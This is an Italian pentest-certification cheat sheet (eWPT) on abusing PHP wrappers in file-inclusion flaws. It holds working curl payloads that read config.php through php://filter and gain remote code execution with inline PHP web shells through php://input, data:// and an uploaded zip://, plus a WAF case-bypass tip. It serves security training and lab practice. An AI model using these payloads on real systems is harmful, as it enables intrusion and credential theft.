---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "PHP Wrappers"
permalink: "/cheatsheet/ewpt/03-file-inclusion/04-wrappers-php/"
section: "File Inclusion"
section_order: 3
order: 4
sort_key: 304
---

**Difficoltà:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [03-RFI-Techniques.md](/cheatsheet/ewpt/03-file-inclusion/03-rfi-techniques/)
**Lab:** PortSwigger / HTB (LFI con wrapper)

---

## Obiettivo

Quando `allow_url_include` è disattivato (il caso più comune oggi) e non hai un log da avvelenare, non sei bloccato: i wrapper PHP (`php://filter`, `php://input`, `data://`, `expect://`, `zip://`, `phar://`) aprono altre strade, dalla lettura del codice sorgente fino alla RCE diretta. È la cassetta degli attrezzi da tenere pronta per quando LFI/RFI "standard" non bastano.

---

## Concetti chiave

### Wrapper principali

| Wrapper | Uso |
|---------|-----|
| `php://filter` | legge/trasforma il contenuto di un file (es. base64) senza eseguirlo |
| `php://input` | legge il body della richiesta POST come "file" incluso (RCE se combinato con LFI) |
| `data://` | inietta dati arbitrari (anche codice) come se fossero un file, funziona se `allow_url_include=On` |
| `zip://` / `phar://` | esegue codice contenuto in un archivio caricato sul server |
| `expect://` | esegue comandi di sistema direttamente (richiede estensione `expect`, raro) |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| curl | wrapper nell'URL | contenuto/esecuzione | manuale, principale strumento |
| python3 | costruire zip/phar malevoli | archivio pronto | per zip://phar:// |

---

## Payload / Esempi

### Esempio 1: leggere codice sorgente PHP senza eseguirlo

```bash
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php"
```

**Output atteso:** stringa base64, da decodificare:
```bash
echo "PD9waHAgJGRiX3Bhc3MgPSAic2VjcmV0IjsgPz4=" | base64 -d
```

**Spiegazione:** senza il filtro `convert.base64-encode` il codice PHP incluso verrebbe eseguito invece di mostrato; encodandolo in base64 lo leggi come testo, rivelando spesso credenziali hardcoded nel `config.php`.

### Esempio 2: RCE con php://input

**Setup:**
- Target: LFI confermata su un parametro incluso con `include()`/`require()`
- **Non serve `allow_url_include=On`**: `php://input` non è un wrapper che recupera contenuto remoto (a differenza di `data://` o della RFI classica), quindi PHP lo consente anche con `allow_url_include=Off`, ed è proprio per questo che è l'alternativa più affidabile quando quella direttiva è disattivata (vedi Obiettivo del file)

**Step-by-step:**
```bash
curl -X POST "http://target.com/index.php?page=php://input&cmd=id" \
  --data '<?php system($_GET["cmd"]); ?>'
```

**Spiegazione:** `php://input` fa sì che il body della richiesta POST venga trattato come il "file" da includere: se contiene codice PHP valido, viene eseguito. Ogni richiesta a `php://input` è indipendente: il payload PHP nel body e il parametro `cmd` devono trovarsi nella STESSA richiesta, non in due richieste separate (non c'è stato condiviso tra richieste come invece accade con log/session poisoning).

### Esempio 3: data:// wrapper per RCE diretta

```bash
curl "http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"
```

**Spiegazione:** il base64 decodifica in `<?php system($_GET['cmd']); ?>`; funziona solo se `allow_url_include=On` dato che `data://` è considerato "esterno" da PHP.

### Esempio 4: zip:// per eseguire codice da un file caricato

```bash
# Step 1: crea un archivio zip con dentro shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip payload.zip shell.php

# Step 2: rinomina/carica payload.zip come immagine se serve bypassare un upload filter (vedi 08-Exploitation-PostEx)
# Step 3: includi il contenuto tramite wrapper zip
curl "http://target.com/index.php?page=zip://uploads/payload.zip%23shell.php&cmd=id"
```

**Spiegazione:** `%23` è il carattere `#` URL-encoded, separatore tra path dello zip e file interno da estrarre/eseguire.

---

## Evasion / Bypass Techniques

### Bypass filtro che blocca la parola "php"

```
PHP://filter/convert.base64-encode/resource=config.php   (case variation, raro)
```
In generale se "php://" è bloccato letteralmente da un WAF, prova doppio encoding o combinazioni case-insensitive: molti filtri regex sono case-sensitive per errore.

---

## Lab Hands-On

### Lab 1: PortSwigger / HTB (LFI con php://filter)
**Obiettivo:** estrarre codice sorgente sensibile via wrapper
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Conferma LFI su un file `.php`
2. Usa `php://filter/convert.base64-encode/resource=` per leggerne il sorgente
3. Cerca credenziali/secret nel codice estratto

---

## Common Mistakes

- Dimenticare `convert.base64-encode` e ricevere una pagina bianca (il PHP viene eseguito, non mostrato) -> sempre passare dal base64
- Non URL-encodare correttamente `#` in zip:// -> usa `%23`

---

## Link Utili

- [PHP Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
- [HackTricks: LFI/RFI wrappers](https://book.hacktricks.xyz/)

---

## Connessioni

- **Prerequisito:** [03-RFI-Techniques.md](/cheatsheet/ewpt/03-file-inclusion/03-rfi-techniques/)
- **Prossimo Step:** [05-Evasion-Filters.md](/cheatsheet/ewpt/03-file-inclusion/05-evasion-filters/)
- **Combinazione con:** [08-Exploitation-PostEx/01-File-Upload-Abuse.md](/cheatsheet/ewpt/08-exploitation-postex/01-file-upload-abuse/)

---

## Checklist di padronanza

- [ ] So usare php://filter per leggere sorgenti senza eseguirli
- [ ] So tentare RCE con php://input
- [ ] So costruire ed eseguire un payload zip://
- [ ] Conosco la differenza pratica tra i vari wrapper
